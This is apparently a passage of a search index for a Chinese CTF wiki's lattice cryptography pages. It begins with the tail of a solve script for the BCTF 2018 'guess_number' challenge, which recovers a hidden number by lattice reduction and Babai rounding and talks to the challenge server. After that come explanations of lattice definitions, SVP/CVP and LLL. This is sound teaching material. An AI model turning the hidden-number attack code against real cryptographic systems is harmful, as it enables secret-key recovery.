. makefile ( 'rw' , 0 ) def recv_until ( f , delim = ' \\n ' ): buf = '' while not buf . endswith ( delim ): buf += f . read ( 1 ) return buf p = 1461501637330902918203684832716283019655932542983 k = 10 def solve_hnp ( t , u ): # http://www.isg.rhul.ac.uk/~sdg/igor-slides.pdf M = Matrix ( RationalField (), 23 , 23 ) for i in xrange ( 22 ): M [ i , i ] = p M [ 22 , i ] = t [ i ] M [ 22 , 22 ] = 1 / ( 2 ** ( k + 1 )) def babai ( A , w ): A = A . LLL ( delta = 0.75 ) G = A . gram_schmidt ()[ 0 ] t = w for i in reversed ( range ( A . nrows ())): c = (( t * G [ i ]) / ( G [ i ] * G [ i ])) . round () t -= A [ i ] * c return w - t closest = babai ( M , vector ( u + [ 0 ])) return ( closest [ - 1 ] * ( 2 ** ( k + 1 ))) % p for i in xrange ( 5 ): t = ast . literal_eval ( f . readline () . strip ()) u = ast . literal_eval ( f . readline () . strip ()) alpha = solve_hnp ( t , u ) recv_until ( f , 'number: ' ) s . send ( str ( alpha ) + ' \\n ' ) t = telnetlib . Telnet () t . sock = s t . interact ()","title":"BCTF 2018 - guess_number"},{"location":"crypto/asymmetric/lattice/cvp/#_2","text":"Lecture 3 - CVP algorithm Wikipedia Playing \u201cHide-and-Seek\u201d in Finite Fields: Hidden Number Problem and Its Applications https://www.math.auckland.ac.nz/~sgal018/crypto-book/ch18.pdf","title":"\u53c2\u8003"},{"location":"crypto/asymmetric/lattice/introduction/","text":"\u57fa\u672c\u4ecb\u7ecd \u00b6 \u683c\u5b9a\u4e49 \u00b6 \u683c\u662f m \u7ef4\u6b27\u5f0f\u7a7a\u95f4 R^m R^m \u7684 n ( m\\geq n m\\geq n ) \u4e2a\u7ebf\u6027\u65e0\u5173\u5411\u91cf b_i(1\\leq i \\leq n) b_i(1\\leq i \\leq n) \u7684\u6240\u6709\u6574\u7cfb\u6570\u7684\u7ebf\u6027\u7ec4\u5408\uff0c\u5373 L(B)=\\{\\sum\\limits_{i=1}^{n}x_ib_i:x_i \\in Z,1\\leq i \\leq n\\} L(B)=\\{\\sum\\limits_{i=1}^{n}x_ib_i:x_i \\in Z,1\\leq i \\leq n\\} \u8fd9\u91cc B \u5c31\u662f n \u4e2a\u5411\u91cf\u7684\u96c6\u5408\uff0c\u6211\u4eec\u79f0 \u8fd9 n \u4e2a\u5411\u91cf\u662f\u683c L \u7684\u4e00\u7ec4\u57fa\u3002 \u683c L \u7684\u79e9\u4e3a n\u3002 \u683c L \u7684\u4f4d\u6570\u4e3a m\u3002 \u5982\u679c m=n\uff0c\u90a3\u4e48\u6211\u4eec\u79f0\u8fd9\u4e2a\u683c\u5f0f\u6ee1\u79e9\u7684\u3002 \u5f53\u7136\uff0c\u4e5f\u53ef\u4ee5\u662f\u5176\u5b83\u7fa4\uff0c\u4e0d\u662f R^m R^m \u3002 \u683c\u4e2d\u82e5\u5e72\u57fa\u672c\u5b9a\u4e49 \u00b6 successive minima \u00b6 \u683c\u662f m \u7ef4\u6b27\u5f0f\u7a7a\u95f4 R^m R^m \u7684\u79e9\u4e3a n \u7684\u683c\uff0c\u90a3\u4e48 L \u7684\u8fde\u7eed\u6700\u5c0f\u957f\u5ea6(successive minima)\u4e3a \\lambda_1,...,\\lambda_n \\in R \\lambda_1,...,\\lambda_n \\in R \uff0c\u6ee1\u8db3\u5bf9\u4e8e\u4efb\u610f\u7684 1\\leq i\\leq n 1\\leq i\\leq n \uff0c \\lambda_i \\lambda_i \u662f\u6ee1\u8db3\u683c\u4e2d i \u4e2a\u7ebf\u6027\u65e0\u5173\u7684\u5411\u91cf v_i v_i \uff0c ||v_j||\\leq \\lambda_i,1\\leq j\\leq i ||v_j||\\leq \\lambda_i,1\\leq j\\leq i \u7684\u6700\u5c0f\u503c\u3002 \u81ea\u7136\u7684 \\lambda_i \\leq \\lambda_j ,\\forall i <j \\lambda_i \\leq \\lambda_j ,\\forall i <j \u3002 \u683c\u4e2d\u8ba1\u7b97\u56f0\u96be\u6027\u95ee\u9898 \u00b6 \u6700\u77ed\u5411\u91cf\u95ee\u9898(Shortest Vector Problem\uff0cSVP) \uff1a\u7ed9\u5b9a\u683c L \u53ca\u5176\u57fa\u5411\u91cf B \uff0c\u627e\u5230\u683c L \u4e2d\u7684\u975e\u96f6\u5411\u91cf v \u4f7f\u5f97\u5bf9\u4e8e\u683c\u4e2d\u7684\u4efb\u610f\u5176\u5b83\u975e\u96f6\u5411\u91cf u\uff0c ||v|| \\leq ||u|| ||v|| \\leq ||u|| \u3002 \\gamma \\gamma -\u8fd1\u4f3c\u6700\u77ed\u5411\u91cf\u95ee\u9898(SVP- \\gamma \\gamma ) \uff1a\u7ed9\u5b9a\u683c L\uff0c\u627e\u5230\u683c L \u4e2d\u7684\u975e\u96f6\u5411\u91cf v \u4f7f\u5f97\u5bf9\u4e8e\u683c\u4e2d\u7684\u4efb\u610f\u5176\u5b83\u975e\u96f6\u5411\u91cf u\uff0c ||v|| \\leq \\gamma||u|| ||v|| \\leq \\gamma||u|| \u3002 \u8fde\u7eed\u6700\u5c0f\u957f\u5ea6\u95ee\u9898(Successive Minima Problem, SMP) :\u7ed9\u5b9a\u79e9\u4e3a n \u7684\u683c L\uff0c\u627e\u5230\u683c L \u4e2d n \u4e2a\u7ebf\u6027\u65e0\u5173\u5411\u91cf s_i s_i \uff0c\u6ee1\u8db3 \\lambda_i(L)=||s_i||, 1\\leq i \\leq n \\lambda_i(L)=||s_i||, 1\\leq i \\leq n \u3002 \u6700\u77ed\u7ebf\u6027\u65e0\u5173\u5411\u91cf\u95ee\u9898(Shortest Independent Vector Problem, SIVP) \uff1a\u7ed9\u5b9a\u4e00\u4e2a\u79e9\u4e3a n \u7684\u683c L\uff0c\u627e\u5230\u683c L \u4e2d n \u4e2a\u7ebf\u6027\u65e0\u5173\u5411\u91cf s_i s_i \uff0c\u6ee1\u8db3 ||s_i|| \\leq \\lambda_n(L), 1\\leq i \\leq n ||s_i|| \\leq \\lambda_n(L), 1\\leq i \\leq n \u3002 \u552f\u4e00\u6700\u77ed\u5411\u91cf\u95ee\u9898(Unique Shortest Vector Problem, uSVP- \\gamma \\gamma ) \uff1a\u7ed9\u5b9a\u683c L\uff0c\u6ee1\u8db3 $ \\lambda_2(L) > \\gamma \\lambda_1(L)$\uff0c\u627e\u5230\u8be5\u683c\u7684\u6700\u77ed\u5411\u91cf\u3002 \u6700\u8fd1\u5411\u91cf\u95ee\u9898(Closest Vector Problem\uff0cCVP) \uff1a\u7ed9\u5b9a\u683c L\u548c\u76ee\u6807\u5411\u91cf t\\in R^m t\\in R^m \uff0c\u627e\u5230\u4e00\u4e2a\u683c\u4e2d\u7684\u975e\u96f6\u5411\u91cf v\uff0c\u4f7f\u5f97\u5bf9\u4e8e\u683c\u4e2d\u7684\u4efb\u610f\u975e\u96f6\u5411\u91cf u\uff0c\u6ee1\u8db3 ||v-t|| \\leq ||u-t|| ||v-t|| \\leq ||u-t|| \u3002","title":"\u57fa\u672c\u4ecb\u7ecd"},{"location":"crypto/asymmetric/lattice/introduction/#_1","text":"","title":"\u57fa\u672c\u4ecb\u7ecd"},{"location":"crypto/asymmetric/lattice/introduction/#_2","text":"\u683c\u662f m \u7ef4\u6b27\u5f0f\u7a7a\u95f4 R^m R^m \u7684 n ( m\\geq n m\\geq n ) \u4e2a\u7ebf\u6027\u65e0\u5173\u5411\u91cf b_i(1\\leq i \\leq n) b_i(1\\leq i \\leq n) \u7684\u6240\u6709\u6574\u7cfb\u6570\u7684\u7ebf\u6027\u7ec4\u5408\uff0c\u5373 L(B)=\\{\\sum\\limits_{i=1}^{n}x_ib_i:x_i \\in Z,1\\leq i \\leq n\\} L(B)=\\{\\sum\\limits_{i=1}^{n}x_ib_i:x_i \\in Z,1\\leq i \\leq n\\} \u8fd9\u91cc B \u5c31\u662f n \u4e2a\u5411\u91cf\u7684\u96c6\u5408\uff0c\u6211\u4eec\u79f0 \u8fd9 n \u4e2a\u5411\u91cf\u662f\u683c L \u7684\u4e00\u7ec4\u57fa\u3002 \u683c L \u7684\u79e9\u4e3a n\u3002 \u683c L \u7684\u4f4d\u6570\u4e3a m\u3002 \u5982\u679c m=n\uff0c\u90a3\u4e48\u6211\u4eec\u79f0\u8fd9\u4e2a\u683c\u5f0f\u6ee1\u79e9\u7684\u3002 \u5f53\u7136\uff0c\u4e5f\u53ef\u4ee5\u662f\u5176\u5b83\u7fa4\uff0c\u4e0d\u662f R^m R^m \u3002","title":"\u683c\u5b9a\u4e49"},{"location":"crypto/asymmetric/lattice/introduction/#_3","text":"","title":"\u683c\u4e2d\u82e5\u5e72\u57fa\u672c\u5b9a\u4e49"},{"location":"crypto/asymmetric/lattice/introduction/#successive-minima","text":"\u683c\u662f m \u7ef4\u6b27\u5f0f\u7a7a\u95f4 R^m R^m \u7684\u79e9\u4e3a n \u7684\u683c\uff0c\u90a3\u4e48 L \u7684\u8fde\u7eed\u6700\u5c0f\u957f\u5ea6(successive minima)\u4e3a \\lambda_1,...,\\lambda_n \\in R \\lambda_1,...,\\lambda_n \\in R \uff0c\u6ee1\u8db3\u5bf9\u4e8e\u4efb\u610f\u7684 1\\leq i\\leq n 1\\leq i\\leq n \uff0c \\lambda_i \\lambda_i \u662f\u6ee1\u8db3\u683c\u4e2d i \u4e2a\u7ebf\u6027\u65e0\u5173\u7684\u5411\u91cf v_i v_i \uff0c ||v_j||\\leq \\lambda_i,1\\leq j\\leq i ||v_j||\\leq \\lambda_i,1\\leq j\\leq i \u7684\u6700\u5c0f\u503c\u3002 \u81ea\u7136\u7684 \\lambda_i \\leq \\lambda_j ,\\forall i <j \\lambda_i \\leq \\lambda_j ,\\forall i <j \u3002","title":"successive minima"},{"location":"crypto/asymmetric/lattice/introduction/#_4","text":"\u6700\u77ed\u5411\u91cf\u95ee\u9898(Shortest Vector Problem\uff0cSVP) \uff1a\u7ed9\u5b9a\u683c L \u53ca\u5176\u57fa\u5411\u91cf B \uff0c\u627e\u5230\u683c L \u4e2d\u7684\u975e\u96f6\u5411\u91cf v \u4f7f\u5f97\u5bf9\u4e8e\u683c\u4e2d\u7684\u4efb\u610f\u5176\u5b83\u975e\u96f6\u5411\u91cf u\uff0c ||v|| \\leq ||u|| ||v|| \\leq ||u|| \u3002 \\gamma \\gamma -\u8fd1\u4f3c\u6700\u77ed\u5411\u91cf\u95ee\u9898(SVP- \\gamma \\gamma ) \uff1a\u7ed9\u5b9a\u683c L\uff0c\u627e\u5230\u683c L \u4e2d\u7684\u975e\u96f6\u5411\u91cf v \u4f7f\u5f97\u5bf9\u4e8e\u683c\u4e2d\u7684\u4efb\u610f\u5176\u5b83\u975e\u96f6\u5411\u91cf u\uff0c ||v|| \\leq \\gamma||u|| ||v|| \\leq \\gamma||u|| \u3002 \u8fde\u7eed\u6700\u5c0f\u957f\u5ea6\u95ee\u9898(Successive Minima Problem, SMP) :\u7ed9\u5b9a\u79e9\u4e3a n \u7684\u683c L\uff0c\u627e\u5230\u683c L \u4e2d n \u4e2a\u7ebf\u6027\u65e0\u5173\u5411\u91cf s_i s_i \uff0c\u6ee1\u8db3 \\lambda_i(L)=||s_i||, 1\\leq i \\leq n \\lambda_i(L)=||s_i||, 1\\leq i \\leq n \u3002 \u6700\u77ed\u7ebf\u6027\u65e0\u5173\u5411\u91cf\u95ee\u9898(Shortest Independent Vector Problem, SIVP) \uff1a\u7ed9\u5b9a\u4e00\u4e2a\u79e9\u4e3a n \u7684\u683c L\uff0c\u627e\u5230\u683c L \u4e2d n \u4e2a\u7ebf\u6027\u65e0\u5173\u5411\u91cf s_i s_i \uff0c\u6ee1\u8db3 ||s_i|| \\leq \\lambda_n(L), 1\\leq i \\leq n ||s_i|| \\leq \\lambda_n(L), 1\\leq i \\leq n \u3002 \u552f\u4e00\u6700\u77ed\u5411\u91cf\u95ee\u9898(Unique Shortest Vector Problem, uSVP- \\gamma \\gamma ) \uff1a\u7ed9\u5b9a\u683c L\uff0c\u6ee1\u8db3 $ \\lambda_2(L) > \\gamma \\lambda_1(L)$\uff0c\u627e\u5230\u8be5\u683c\u7684\u6700\u77ed\u5411\u91cf\u3002 \u6700\u8fd1\u5411\u91cf\u95ee\u9898(Closest Vector Problem\uff0cCVP) \uff1a\u7ed9\u5b9a\u683c L\u548c\u76ee\u6807\u5411\u91cf t\\in R^m t\\in R^m \uff0c\u627e\u5230\u4e00\u4e2a\u683c\u4e2d\u7684\u975e\u96f6\u5411\u91cf v\uff0c\u4f7f\u5f97\u5bf9\u4e8e\u683c\u4e2d\u7684\u4efb\u610f\u975e\u96f6\u5411\u91cf u\uff0c\u6ee1\u8db3 ||v-t|| \\leq ||u-t|| ||v-t|| \\leq ||u-t|| \u3002","title":"\u683c\u4e2d\u8ba1\u7b97\u56f0\u96be\u6027\u95ee\u9898"},{"location":"crypto/asymmetric/lattice/lattice-reduction/","text":"\u683c\u57fa\u89c4\u7ea6\u7b97\u6cd5 \u00b6 Lenstra\u2013Lenstra\u2013Lovasz \u00b6 \u57fa\u672c\u4ecb\u7ecd \u00b6 LLL \u7b97\u6cd5\u5c31\u662f\u5728\u683c\u4e0a\u627e\u5230\u4e00\u7ec4\u57fa\uff0c\u6ee1\u8db3\u5982\u4e0b\u6548\u679c \u800c\u4e14\uff0c\u8fd9\u79cd\u65b9\u6cd5\u751f\u6210\u7684\u57fa\u6240\u5177\u6709\u7684\u5982\u4e0b\u6027\u8d28\u662f\u975e\u5e38\u6709\u7528\u7684 \u7b80\u5355\u5e94\u7528 \u00b6 \u8fd9\u91cc\u6211\u4e3e\u4e00\u4e0b LLL paper \u4e2d\u7ed9\u7684\u7b2c\u4e8c\u4e2a\u4f8b\u5b50\u3002\u7ed9\u5b9a n \u4e2a\u5b9e\u6570 \\alpha_i,...,\\alpha_n \\alpha_i,...,\\alpha_n \uff0c\u627e\u5230\u8fd9 n \u4e2a\u6570\u7684\u6709\u7406\u7ebf\u6027\u903c\u8fd1\uff0c\u5373\u627e\u5230 n \u4e2a\u6570 m_i m_i \uff0c\u4f7f\u5f97 \\sum\\limits_{i=1}^{n}m_i\\alpha_i \\sum\\limits_{i=1}^{n}m_i\\alpha_i \u5c3d\u53ef\u80fd\u7b49\u4e8e 0\u3002 \u6211\u4eec\u53ef\u4ee5\u6784\u9020\u8fd9\u6837\u7684\u77e9\u9635\uff0c\u8fd9\u91cc a_i a_i \u4e3a \\alpha_i \\alpha_i \u7684\u6709\u7406\u903c\u8fd1\u3002 A = \\left[ \\begin{matrix} 1 & 0 & 0 & \\cdots & 0 & ca_1 \\\\ 0 & 1 & 0 & \\cdots & 0 & c a_2 \\\\ 0 & 0 & 1 & \\cdots & 0 & c a_3 \\\\\\vdots & \\vdots & \\vdots & \\ddots & \\vdots \\\\ 0 & 0 &0 & \\cdots & 1 & c a_n \\\\ \\end{matrix} \\right] A = \\left[ \\begin{matrix} 1 & 0 & 0 & \\cdots & 0 & ca_1 \\\\ 0 & 1 & 0 & \\cdots & 0 & c a_2 \\\\ 0 & 0 & 1 & \\cdots & 0 & c a_3 \\\\\\vdots & \\vdots & \\vdots & \\ddots & \\vdots \\\\ 0 & 0 &0 & \\cdots & 1 & c a_n \\\\ \\end{matrix} \\right] \u77e9\u9635\u4e3a n*(n+1) \u7684\uff0c\u6211\u4eec\u53ef\u4ee5\u6839\u636e\u683c\u6c42\u884c\u5217\u5f0f\u7684\u65b9\u6cd5\u6765\u6c42\u4e00\u4e0b\u8fd9\u4e2a\u683c\u5bf9\u5e94\u7684\u884c\u5217\u5f0f\u3002 det(L)=\\sqrt{AA^T} det(L)=\\sqrt{AA^T} \u6211\u4eec\u8fdb\u4e00\u6b65\u8003\u8651\u8fd9\u6837\u7684\u77e9\u9635 A = \\left[ \\begin{matrix} 1 & 0 & 0 & \\cdots & 0 & a_1 \\\\ 0 & 1 & 0 & \\cdots & 0 & a_2 \\\\ 0 & 0 & 1 & \\cdots & 0 & a_3 \\\\\\vdots & \\vdots & \\vdots & \\ddots & \\vdots \\\\ 0 & 0 &0 & \\cdots & 1 & a_n \\\\ \\end{matrix} \\right] A = \\left[ \\begin{matrix} 1 & 0 & 0 & \\cdots & 0 & a_1 \\\\ 0 & 1 & 0 & \\cdots & 0 & a_2 \\\\ 0 & 0 & 1 & \\cdots & 0 & a_3 \\\\\\vdots & \\vdots & \\vdots & \\ddots & \\vdots \\\\ 0 & 0 &0 & \\cdots & 1 & a_n \\\\ \\end{matrix} \\right] \u90a3\u4e48 AA^T = \\left[ \\begin{matrix} 1+a_1^2 & a_1a_2 & a_1a_3 & \\cdots & a_1a_n \\\\ a_2a_1 & 1+a_2^2 & a_2a_3 & \\cdots & a_2a_n \\\\ a_3a_1 & a_3a_2 & 1+a_3^2 & \\cdots & a_3a_n \\\\ \\vdots & \\vdots & \\vdots & \\ddots & \\vdots \\\\ a_na_1 & a_na_2 &a_na_3 & \\cdots & 1+a_n^2 \\\\ \\end{matrix} \\right] AA^T = \\left[ \\begin{matrix} 1+a_1^2 & a_1a_2 & a_1a_3 & \\cdots & a_1a_n \\\\ a_2a_1 & 1+a_2^2 & a_2a_3 & \\cdots & a_2a_n \\\\ a_3a_1 & a_3a_2 & 1+a_3^2 & \\cdots & a_3a_n \\\\ \\vdots & \\vdots & \\vdots & \\ddots & \\vdots \\\\ a_na_1 & a_na_2 &a_na_3 & \\cdots & 1+a_n^2 \\\\ \\end{matrix} \\right] \u8fdb\u4e00\u6b65\u6211\u4eec\u4ece\u4f4e\u7ef4\u5230\u9ad8\u7ef4\u5927\u6982\u8bd5\u4e00\u8bd5\uff08\u4e25\u683c\u8bc1\u660e\uff0c\u53ef\u4ee5\u8003\u8651\u6dfb\u52a0\u4e00\u884c\u548c\u4e00\u5217\uff0c\u5de6\u4e0a\u89d2\u4e3a1\uff09\uff0c\u5f97\u5230\u683c\u7684\u884c\u5217\u5f0f\u4e3a \\sqrt{1+\\sum\\limits_{i=1}^n\\alpha_i^2} \\sqrt{1+\\sum\\limits_{i=1}^n\\alpha_i^2} \u53ef\u4ee5\u53c2\u89c1\u8003\u7814\u5b87\u54e5\u7684\u5982\u4e0b\u8bc1\u660e \u90a3\u4e48\u7ecf\u8fc7 LLL \u7b97\u6cd5\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u83b7\u5f97 ||b_1|| \\leq 2^{\\frac{n-1}{4}} (1+\\sum\\limits_{i=1}^n\\alpha_i^2)^{\\frac{1}{2(n+1)}} ||b_1|| \\leq 2^{\\frac{n-1}{4}} (1+\\sum\\limits_{i=1}^n\\alpha_i^2)^{\\frac{1}{2(n+1)}} \u4e00\u822c\u6765\u8bf4\u540e\u4e00\u9879\u5728\u5f00 n \u6b21\u65b9\u65f6\u8d8b\u5411\u4e8e1\uff0c\u56e0\u4e3a a_i a_i \u90fd\u662f\u5e38\u6570\uff0c\u4e00\u822c\u4e0d\u4f1a\u548c n \u76f8\u5173\uff0c\u6240\u4ee5 ||b_1|| \\leq 2^{\\frac{n-1}{4}}*k ||b_1|| \\leq 2^{\\frac{n-1}{4}}*k k \u6bd4\u8f83\u5c0f\u3002\u6b64\u5916\uff0c b_1 b_1 \u53c8\u662f\u539f\u5411\u91cf\u7684\u7ebf\u6027\u7ec4\u5408\uff0c\u90a3\u4e48 b_1[n]=\\sum\\limits_{i=1}^{n}m_ic*a_i=c\\sum\\limits_{i=1}^{n}m_i*a_i b_1[n]=\\sum\\limits_{i=1}^{n}m_ic*a_i=c\\sum\\limits_{i=1}^{n}m_i*a_i \u663e\u7136\u5982\u679c c \u8db3\u591f\u5927\uff0c\u90a3\u4e48\u540e\u9762\u7684\u6c42\u548c\u5fc5\u987b\u8db3\u591f\u5c0f\uff0c\u624d\u53ef\u4ee5\u6ee1\u8db3\u4e0a\u9762\u7684\u7ea6\u675f\u3002 \u53c2\u8003 \u00b6 Survey: Lattice Reduction Attacks on RSA","title":"\u683c\u57fa\u89c4\u7ea6\u7b97\u6cd5"},{"location":"crypto/asymmetric/lattice/lattice-reduction/#_1","text":"","title":"\u683c\u57fa\u89c4\u7ea6\u7b97\u6cd5"},{"location":"crypto/asymmetric/lattice/lattice-reduction/#lenstralenstralovasz","text":"","title":"Lenstra\u2013Lenstra\u2013Lovasz"},{"location":"crypto/asymmetric/lattice/lattice-reduction/#_2","text":"LLL \u7b97\u6cd5\u5c31\u662f\u5728\u683c\u4e0a\u627e\u5230\u4e00\u7ec4\u57fa\uff0c\u6ee1\u8db3\u5982\u4e0b\u6548\u679c \u800c\u4e14\uff0c\u8fd9\u79cd\u65b9\u6cd5\u751f\u6210\u7684\u57fa\u6240\u5177\u6709\u7684\u5982\u4e0b\u6027\u8d28\u662f\u975e\u5e38\u6709\u7528\u7684","title":"\u57fa\u672c\u4ecb\u7ecd"},{"location":"crypto/asymmetric/lattice/lattice-reduction/#_3","text":"\u8fd9\u91cc\u6211\u4e3e\u4e00\u4e0b LLL paper \u4e2d\u7ed9\u7684\u7b2c\u4e8c\u4e2a\u4f8b\u5b50\u3002\u7ed9\u5b9a n \u4e2a\u5b9e\u6570 \\alpha_i,...,\\alpha_n \\alpha_i,...,\\alpha_n \uff0c\u627e\u5230\u8fd9 n \u4e2a\u6570\u7684\u6709\u7406\u7ebf\u6027\u903c\u8fd1\uff0c\u5373\u627e\u5230 n \u4e2a\u6570 m_i m_i \uff0c\u4f7f\u5f97 \\sum\\limits_{i=1}^{n}m_i\\alpha_i \\sum\\limits_{i=1}^{n}m_i\\alpha_i \u5c3d\u53ef\u80fd\u7b49\u4e8e 0\u3002 \u6211\u4eec\u53ef\u4ee5\u6784\u9020\u8fd9\u6837\u7684\u77e9\u9635\uff0c\u8fd9\u91cc a_i a_i \u4e3a \\alpha_i \\alpha_i \u7684\u6709\u7406\u903c\u8fd1\u3002 A = \\left[ \\begin{matrix} 1 & 0 & 0 & \\cdots & 0 & ca_1 \\\\ 0 & 1 & 0 & \\cdots & 0 & c a_2 \\\\ 0 & 0 & 1 & \\cdots & 0 & c a_3 \\\\\\vdots & \\vdots & \\vdots & \\ddots & \\vdots \\\\ 0 & 0 &0 & \\cdots & 1 & c a_n \\\\ \\end{matrix} \\right] A = \\left[ \\begin{matrix} 1 & 0 & 0 & \\cdots & 0 & ca_1 \\\\ 0 & 1 & 0 & \\cdots & 0 & c a_2 \\\\ 0 & 0 & 1 & \\cdots & 0 & c a_3 \\\\\\vdots & \\vdots & \\vdots & \\ddots & \\vdots \\\\ 0 & 0 &0 & \\cdots & 1 & c a_n \\\\ \\end{matrix} \\right] \u77e9\u9635\u4e3a n*(n+1) \u7684\uff0c\u6211\u4eec\u53ef\u4ee5\u6839\u636e\u683c\u6c42\u884c\u5217\u5f0f\u7684\u65b9\u6cd5\u6765\u6c42\u4e00\u4e0b\u8fd9\u4e2a\u683c\u5bf9\u5e94\u7684\u884c\u5217\u5f0f\u3002 det(L)=\\sqrt{AA^T} det(L)=\\sqrt{AA^T} \u6211\u4eec\u8fdb\u4e00\u6b65\u8003\u8651\u8fd9\u6837\u7684\u77e9\u9635 A = \\left[ \\begin{matrix} 1 & 0 & 0 & \\cdots & 0 & a_1 \\\\ 0 & 1 & 0 & \\cdots & 0 & a_2 \\\\ 0 & 0 & 1 & \\cdots & 0 & a_3 \\\\\\vdots & \\vdots & \\vdots & \\ddots & \\vdots \\\\ 0 & 0 &0 & \\cdots & 1 & a_n \\\\ \\end{matrix} \\right] A = \\left[ \\begin{matrix} 1 & 0 & 0 & \\cdots & 0 & a_1 \\\\ 0 & 1 & 0 & \\cdots & 0 & a_2 \\\\ 0 & 0 & 1 & \\cdots & 0 & a_3 \\\\\\vdots & \\vdots & \\vdots & \\ddots & \\vdots \\\\ 0 & 0 &0 & \\cdots & 1 & a_n \\\\ \\end{matrix} \\right] \u90a3\u4e48 AA^T = \\left[ \\begin{matrix} 1+a_1^2 & a_1a_2 & a_1a_3 & \\cdots & a_1a_n \\\\ a_2a_1 & 1+a_2^2 & a_2a_3 & \\cdots & a_2a_n \\\\ a_3a_1 & a_3a_2 & 1+a_3^2 & \\cdots & a_3a_n \\\\ \\vdots & \\vdots & \\vdots & \\ddots & \\vdots \\\\ a_na_1 & a_na_2 &a_na_3 & \\cdots & 1+a_n^2 \\\\ \\end{matrix} \\right] AA^T = \\left[ \\begin{matrix} 1+a_1^2 & a_1a_2 & a_1a_3 & \\cdots & a_1a_n \\\\ a_2a_1 & 1+a_2^2 & a_2a_3 & \\cdots & a_2a_n \\\\ a_3a_1 & a_3a_2 & 1+a_3^2 & \\cdots & a_3a_n \\\\ \\vdots & \\vdots & \\vdots & \\ddots & \\vdots \\\\ a_na_1 & a_na_2 &a_na_3 & \\cdots & 1+a_n^2 \\\\ \\end{matrix} \\right] \u8fdb\u4e00\u6b65\u6211\u4eec\u4ece\u4f4e\u7ef4\u5230\u9ad8\u7ef4\u5927\u6982\u8bd5\u4e00\u8bd5\uff08\u4e25\u683c\u8bc1\u660e\uff0c\u53ef\u4ee5\u8003\u8651\u6dfb\u52a0\u4e00\u884c\u548c\u4e00\u5217\uff0c\u5de6\u4e0a\u89d2\u4e3a1\uff09\uff0c\u5f97\u5230\u683c\u7684\u884c\u5217\u5f0f\u4e3a \\sqrt{1+\\sum\\limits_{i=1}^n\\alpha_i^2} \\sqrt{1+\\sum\\limits_{i=1}^n\\alpha_i^2} \u53ef\u4ee5\u53c2\u89c1\u8003\u7814\u5b87\u54e5\u7684\u5982\u4e0b\u8bc1\u660e \u90a3\u4e48\u7ecf\u8fc7 LLL \u7b97\u6cd5\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u83b7\u5f97 ||b_1|| \\leq 2^{\\frac{n-1}{4}} (1+\\sum\\limits_{i=1}^n\\alpha_i^2)^{\\frac{1}{2(n+1)}} ||b_1|| \\leq 2^{\\frac{n-1}{4}} (1+\\sum\\limits_{i=1}^n\\alpha_i^2)^{\\frac{1}{2(n+1)}} \u4e00\u822c\u6765\u8bf4\u540e\u4e00\u9879\u5728\u5f00 n \u6b21\u65b9\u65f6\u8d8b\u5411\u4e8e1\uff0c\u56e0\u4e3a a_i a_i \u90fd\u662f\u5e38\u6570\uff0c\u4e00\u822c\u4e0d\u4f1a\u548c n \u76f8\u5173\uff0c\u6240\u4ee5 ||b_1|| \\leq 2^{\\frac{n-1}{4}}*k ||b_1|| \\leq 2^{\\frac{n-1}{4}}*k k \u6bd4\u8f83\u5c0f\u3002\u6b64\u5916\uff0c b_1 b_1 \u53c8\u662f\u539f\u5411\u91cf\u7684\u7ebf\u6027\u7ec4\u5408\uff0c\u90a3\u4e48 b_1[n]=\\sum\\limits_{i=1}^{n}m_ic*a_i=c\\sum\\limits_{i=1}^{n}m_i*a_i b_1[n]=\\sum\\limits_{i=1}^{n}m_ic*a_i=c\\sum\\limits_{i=1}^{n}m_i*a_i \u663e\u7136\u5982\u679c c \u8db3\u591f\u5927\uff0c\u90a3\u4e48\u540e\u9762\u7684\u6c42\u548c\u5fc5\u987b\u8db3\u591f\u5c0f\uff0c\u624d\u53ef\u4ee5\u6ee1\u8db3\u4e0a\u9762\u7684\u7ea6\u675f\u3002","title":"\u7b80\u5355\u5e94\u7528"},{"location":"crypto/asymmetric/lattice/lattice-reduction/#_4","text":"Survey: Lattice Reduction Attacks on RSA","title":"\u53c2\u8003"},{"location":"crypto/asymmetric/lattice/overview/","text":"\u683c\u6982\u8ff0 \u00b6 \u683c\u5728\u6570\u5b66\u4e0a\u81f3\u5c11\u6709\u4e24\u79cd\u542b\u4e49 \u5b9a\u4e49\u5728\u975e\u7a7a\u6709\u9650\u96c6\u5408\u4e0a\u7684\u504f\u5e8f\u96c6\u5408 L\uff0c\u6ee1\u8db3\u96c6\u5408 L \u4e2d\u7684\u4efb\u610f\u5143\u7d20 a\uff0cb\uff0c\u4f7f\u5f97 a\uff0cb \u5728 L \u4e2d\u5b58\u5728\u4e00\u4e2a\u6700\u5927\u4e0b\u754c\uff0c\u548c\u6700\u5c0f\u4e0a\u754c\u3002\u5177\u4f53\u53c2\u89c1https://en.wikipedia.org/wiki/Lattice_(order)\u3002 \u7fa4\u8bba\u4e2d\u7684\u5b9a\u4e49\uff0c\u662f R^n R^n \u4e2d\u7684\u6ee1\u8db3\u67d0\u79cd\u6027\u8d28\u7684\u5b50\u96c6\u3002\u5f53\u7136\uff0c\u4e5f\u53ef\u4ee5\u662f\u5176\u5b83\u7fa4\u3002 \u76ee\u524d\u5173\u4e8e\u683c\u65b9\u9762\u7684\u7814\u7a76\u4e3b\u8981\u6709\u4ee5\u4e0b\u51e0\u5927\u65b9\u5411 \u683c\u4e2d\u8ba1\u7b97\u95ee\u9898\u7684\u56f0\u96be\u6027\uff0c\u5373\u8fd9\u4e9b\u95ee\u9898\u7684\u8ba1\u7b97\u590d\u6742\u6027\uff0c\u4e3b\u8981\u5305\u62ec SVP \u95ee\u9898 CVP \u95ee\u9898 \u5982\u4f55\u6c42\u89e3\u683c\u4e2d\u7684\u56f0\u96be\u6027\u95ee\u9898\uff0c\u76ee\u524d\u65e2\u6709\u8fd1\u4f3c\u7b97\u6cd5\uff0c\u4e5f\u6709\u4e00\u4e9b\u7cbe\u786e\u6027\u7b97\u6cd5\u3002 \u57fa\u4e8e\u683c\u7684\u5bc6\u7801\u5206\u6790\uff0c\u5373\u5982\u4f55\u5229\u7528\u683c\u7406\u8bba\u5206\u6790\u4e00\u4e9b\u5df2\u6709\u7684\u5bc6\u7801\u5b66\u7b97\u6cd5\uff0c\u76ee\u524d\u6709\u5982\u4e0b\u7814\u7a76 Knapsack cryptosystems DSA nonce biases Factoring RSA keys with bits known Small RSA private exponents Stereotyped messages with small RSA exponents 